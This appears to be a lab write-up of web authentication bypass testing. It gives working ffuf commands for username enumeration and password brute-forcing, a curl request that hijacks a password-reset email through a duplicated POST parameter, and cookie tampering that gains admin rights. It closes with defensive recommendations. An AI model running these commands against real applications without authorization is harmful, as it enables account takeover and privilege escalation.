# Authentication Bypass

## Project Overview

In this project, I explored common authentication weaknesses that can allow attackers to gain unauthorized access to web applications. I assessed several authentication mechanisms, including user registration, login forms, password reset functionality, and session cookies, to identify flaws that could be abused to bypass access controls.

Throughout the assessment, I performed username enumeration, credential brute-forcing, authentication logic testing, and cookie manipulation to demonstrate how insecure authentication implementations can compromise an application's security.

---

## Objectives

- Identify authentication weaknesses within a web application.
- Perform username enumeration.
- Conduct credential brute-force testing.
- Exploit authentication logic flaws.
- Manipulate session cookies to bypass authorization.
- Understand secure authentication design principles.

---

## Skills Learned

- Authentication testing
- Username enumeration
- Credential brute forcing
- Session management analysis
- Cookie manipulation
- Authentication logic analysis
- HTTP request manipulation
- Access control testing
- Web application reconnaissance

---

## Tools & Technologies

- FFUF
- cURL
- Browser Developer Tools
- SecLists
- CrackStation
- Base64 Encoding
- HTTP Cookies

---

# Methodology

## 1. Username Enumeration

I began by assessing the application's registration functionality for username enumeration vulnerabilities.

The registration page returned different responses depending on whether a username already existed. By identifying these unique responses, I was able to enumerate valid usernames without authentication.

### Command Used

```bash
ffuf \
-w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://<target>/customers/signup \
-mr "username already exists"
```

Using this technique, I successfully identified multiple valid user accounts that were later used during authentication testing.

---

## 2. Credential Brute Force

After compiling a list of valid usernames, I performed a password brute-force attack against the login portal using a list of common credentials.

### Command Used

```bash
ffuf \
-w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-X POST \
-d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://<target>/customers/login \
-fc 200
```

The assessment successfully identified a valid username and password combination, demonstrating the risks associated with weak passwords and the absence of account lockout protections.

---

## 3. Authentication Logic Flaw

Next, I evaluated the application's password reset functionality for logic flaws.

During testing, I observed that the application accepted the account email address through the URL query string while simultaneously accepting an email parameter within the POST request.

This inconsistency allowed the password reset email destination to be manipulated.

### Initial Request

```bash
curl "http://<target>/customers/reset?email=victim@example.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=victim"
```

After identifying the application's request handling behavior, I supplied an additional email parameter within the POST body.

### Modified Request

```bash
curl "http://<target>/customers/reset?email=victim@example.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=victim&email=attacker@example.com"
```

Because the application trusted the POST parameter over the query string, the password reset link was redirected to an attacker-controlled email address.

This authentication logic flaw resulted in unauthorized access to another user's account.

---

## 4. Cookie Tampering

I also assessed how the application handled session cookies after authentication.

### Plain Text Cookie Manipulation

Initially, I requested the protected resource without any authentication cookies.

### Command Used

```bash
curl http://<target>/cookie-test
```

Next, I manually supplied authentication cookies indicating a standard user session.

```bash
curl \
-H "Cookie: logged_in=true; admin=false" \
http://<target>/cookie-test
```

Finally, I modified the privilege cookie to impersonate an administrator.

```bash
curl \
-H "Cookie: logged_in=true; admin=true" \
http://<target>/cookie-test
```

Because the application trusted client-side cookie values without proper validation, elevated privileges were successfully obtained.

---

## 5. Cookie Encoding & Hash Analysis

During the assessment, I also examined encoded and hashed cookie values.

I identified examples of:

- Plain-text cookies
- MD5 hashes
- Base64 encoded values

Using online hash databases and Base64 decoding, I demonstrated how encoded values can reveal sensitive session information and how improperly protected client-side data can be modified before being re-encoded.

This exercise reinforced the importance of signing or encrypting session cookies rather than relying solely on encoding.

---

# Key Findings

The assessment identified several authentication weaknesses, including:

- Username enumeration through verbose error messages
- Weak password policy vulnerable to brute-force attacks
- Authentication logic flaw within the password reset process
- Improper handling of password reset requests
- Privilege escalation through cookie tampering
- Client-side trust of authentication cookies
- Sensitive information exposed through encoded session values

---

# Security Recommendations

Based on the assessment, I recommend the following improvements:

- Return generic error messages during registration and login.
- Enforce strong password policies.
- Implement account lockout and rate limiting.
- Validate authentication logic consistently across all workflows.
- Never trust client-side cookie values.
- Digitally sign or encrypt session cookies.
- Implement secure password reset workflows.
- Use server-side session validation for authorization decisions.
- Monitor authentication attempts for suspicious activity.

---

# Lessons Learned

This project demonstrated that authentication security extends beyond login forms.

Weak password policies, verbose error messages, flawed application logic, and insecure session management can all provide attackers with opportunities to bypass authentication controls.

The assessment reinforced the importance of thoroughly evaluating every authentication workflow—including registration, login, password reset, and session handling—rather than focusing solely on credential validation.
